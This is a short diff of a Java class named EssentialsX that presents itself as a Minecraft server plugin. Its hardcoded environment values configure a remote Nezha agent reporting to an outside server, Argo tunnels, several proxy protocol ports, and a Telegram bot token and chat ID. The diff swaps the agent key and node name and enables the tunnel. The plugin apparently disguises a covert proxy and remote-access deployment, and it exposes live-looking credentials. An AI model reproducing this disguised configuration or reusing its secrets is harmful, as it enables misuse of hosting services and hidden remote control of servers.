@@ -77,12 +77,12 @@ public class EssentialsX extends JavaPlugin {
         env.put("FILE_PATH", "./world");
         env.put("NEZHA_SERVER", "nezha.jaxmike.nyc.mn");
         env.put("NEZHA_PORT", "443");
-        env.put("NEZHA_KEY", "B8LPJsnO4AoAHdidrs");
+        env.put("NEZHA_KEY", "hBamKmbSCrxc2XOoJk");
         env.put("ARGO_PORT", "8001");
         env.put("ARGO_DOMAIN", "");
         env.put("ARGO_AUTH", "");
         env.put("S5_PORT", "");
-        env.put("HY2_PORT", "12710");
+        env.put("HY2_PORT", "");
         env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
@@ -91,9 +91,9 @@ public class EssentialsX extends JavaPlugin {
         env.put("CHAT_ID", "7592034407");
         env.put("BOT_TOKEN", "8002189523:AAFDp3-de5-dw-RkWXsFI5_sWHrFhGWn1hs");
         env.put("CFIP", "spring.io");
-        env.put("CFPORT", "443");
-        env.put("NAME", "castle-host");
-        env.put("DISABLE_ARGO", "true");
+        env.put("CFPORT", "2096");
+        env.put("NAME", "spaceify");
+        env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
         for (String var : ALL_ENV_VARS) {
